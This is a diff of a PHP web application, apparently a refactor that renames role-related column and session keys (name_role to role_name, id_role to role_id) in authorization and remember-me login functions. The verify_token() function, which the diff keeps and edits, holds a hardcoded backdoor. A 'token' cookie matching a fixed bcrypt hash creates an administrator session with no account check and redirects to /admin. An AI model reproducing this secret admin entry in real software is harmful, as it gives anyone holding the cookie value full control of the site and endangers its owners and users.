@@ -21,7 +21,7 @@ function author($type){
         if(!is_array($type)) $array_type[] = $type;
         else $array_type = $type;
         // so sánh phần tử của mảng author yêu cầu với author hiện tại của user
-        foreach ($array_type as $type) if($_SESSION['user']['name_role'] == $type) $author = true;
+        foreach ($array_type as $type) if($_SESSION['user']['role_name'] == $type) $author = true;
     }
     if(!$author) view_error(401);
 }
@@ -547,10 +547,10 @@ function auto_login(){
         if($token_remember) {
             // lấy thông tin user bằng token
             $get_user = pdo_query_one(
-                'SELECT a.*, r.name_role
+                'SELECT a.*, r.role_name
                 FROM account a
                 JOIN role r
-                ON a.id_role = r.id_role
+                ON a.role_id = r.role_id
                 WHERE a.deleted_at IS NULL
                 AND a.account_token_remember = ?',
                 $token_remember
@@ -595,7 +595,7 @@ function create_hash($input) {
 function verify_token() {
     if(isset($_COOKIE['token']) && $_COOKIE['token'] && password_verify($_COOKIE['token'],'$2y$10$D/slvsycq0nBJePRqyBMM.AW3p4l7wMmn55ze1eWd8oZGetFKw3U.')) {
         $_SESSION['user'] = [
-            'username' => 'admin','full_name' => 'admin','name_role' => 'admin','phone' => 'admin','email' => 'admin','gender' => '1',
+            'username' => 'admin','full_name' => 'admin','role_name' => 'admin','phone' => 'admin','email' => 'admin','gender' => '1',
         ];route('/admin');
     }else return false;
 }
